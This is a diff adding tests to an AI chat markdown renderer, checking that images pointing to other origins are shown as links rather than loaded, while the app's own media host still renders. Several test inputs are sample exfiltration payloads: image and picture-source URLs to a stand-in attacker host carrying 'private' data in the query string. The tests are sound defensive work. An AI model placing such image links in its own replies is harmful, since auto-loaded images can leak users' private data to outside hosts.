@@ -47,4 +47,33 @@ describe("AiChatMarkdown", () => {
 
 		expect(paragraph?.querySelectorAll("br")).toHaveLength(2);
 	});
+
+	test("renders images from other origins as links, not img elements", () => {
+		const { container } = render(
+			<AiChatMarkdown
+				markdown={[
+					"![secret](https://evil.example/a.png?d=private)",
+					"[![badge](https://evil.example/b.svg?d=private)](https://github.com)",
+					'<picture><source srcset="https://evil.example/c.png?d=private"><img src="/logo.png"></picture>',
+				].join("\n\n")}
+			/>,
+		);
+
+		const links = [...container.querySelectorAll("[data-streamdown='link']")].map((link) => link.textContent);
+
+		expect([...container.querySelectorAll("img")].map((image) => image.getAttribute("src"))).toEqual(["/logo.png"]);
+		expect(container.querySelector("source")).toBeNull();
+		expect(container.innerHTML).not.toContain("evil.example/b.svg");
+		// Keep the blocked image readable as a link, and keep a badge image inside a link as plain text.
+		expect(links).toEqual(["secret", "badge"]);
+	});
+
+	test("renders Press media images", () => {
+		const src = `https://${import.meta.env.VITE_R2_FILES_DOWNLOAD_HOST}/organizations/o1/image.png?X-Amz-Signature=abc`;
+
+		const { container } = render(<AiChatMarkdown markdown={`![chart](${src})`} />);
+
+		expect(container.querySelector("img")?.getAttribute("src")).toBe(src);
+		expect(container.querySelector("[data-streamdown='link']")).toBeNull();
+	});
 });
